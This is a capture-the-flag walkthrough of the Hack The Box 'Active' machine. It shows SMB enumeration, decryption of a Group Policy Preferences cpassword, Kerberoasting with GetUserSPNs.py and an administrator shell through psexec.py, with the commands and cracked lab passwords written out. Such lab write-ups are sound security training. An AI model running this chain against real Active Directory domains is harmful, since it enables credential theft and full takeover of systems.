---
description: Walkthrough (Easy)
---

# Active 🟢🟢🟢

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

[https://app.hackthebox.com/machines/Active](https://app.hackthebox.com/machines/Active)  &#x20;

Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.

### Reconnaissance

```bash
nmap -T4 -F -sVC 10.10.10.100 -oN Nmap
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

* Found SMB open in port 139, 445 lets try it.

### Enumeration

```bash
smbmap -H 10.10.10.100
```

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

* Got Replication folder where we can Read it. So lets connect to that folder :)

```bash
smbclient \\\\10.10.10.100\\Replication
```

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* Inside active.htb directory there are bunch of files and folders available, So lets download them all by using command mget \*

```bash
find . -type f
```

* found come intresting file Groups/Groups.xml

{% code overflow="wrap" fullWidth="true" %}
```xml
┌──(root㉿kali)-[/home/…/Downloads/Machines/HackTheBox/Active]
└─# cat Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
{% endcode %}

* Found User SVC\_TGS and a password hash

### Info about Group Policy Preferences&#x20;

Group Policy Preferences (GPP) was introduced in Windows Server 2008, and among many other features, allowed administrators to modify users and groups across their network. An example use case is where a company’s gold image had a weak local administrator password, and administrators wanted to retrospectively set it to something stronger.&#x20;

The defined password was `AES-256` encrypted and stored in `Groups.xml` . However, at some point in 2012, Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low-hanging fruit.

We extract the encrypted password form the `Groups.xml` file and decrypt it using `gpp-decrypt`

{% code fullWidth="false" %}
```bash
┌──(root㉿kali)-[/home/…/Downloads/Machines/HackTheBox/Active]
└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
{% endcode %}

### Getting User.txt

```bash
smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users
```

* that is -> -U user%password

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

* Goto SVC\_TGS and in Desktop there is user.txt

### Previlage Escalation

```bash
GetADUsers.py -all active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* `GetADUsers.py` is a python script used for Active Directory of SMB and it list all the users in that SMB connection.
* Found 4 users. But interesting is  Administrator the root.
* Check for any activity, request response from Administrator to our SVC\_TGS user

```bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request -save -outputfile hash
```

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

* Captured that hash and cracked it using JohnTheRipper.
* Now we got user:administrator pass:Ticketmaster1968

### Getting Root.txt

```bash
psexec.py Administrator@10.10.10.100 cmd.exe
```

* psexec.py used for SMB connect and remote code execution.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

* Found root flag.&#x20;

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
